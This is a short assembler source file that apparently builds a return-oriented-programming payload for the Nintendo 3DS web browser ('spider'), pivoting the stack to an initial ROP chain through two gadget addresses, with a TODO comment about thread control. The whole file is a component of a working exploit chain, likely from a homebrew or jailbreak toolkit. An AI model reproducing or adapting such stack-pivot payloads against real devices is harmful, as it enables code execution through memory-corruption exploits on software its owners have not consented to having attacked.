.nds

.include "../../build/constants.s"

.create "spider_hook_rop.bin",0x0

; TODO : check if just doing thread0 ROP from thread5 could improve stability (we don't really need full spider control anymore)

.orga 0x0
	.word 0x0013035c ; pop {lr, pc}
		.word SPIDER_INITIALROP_VADR ; lr => sp
	.word 0x00130358 ; mov sp, lr | pop {lr, pc}

.Close
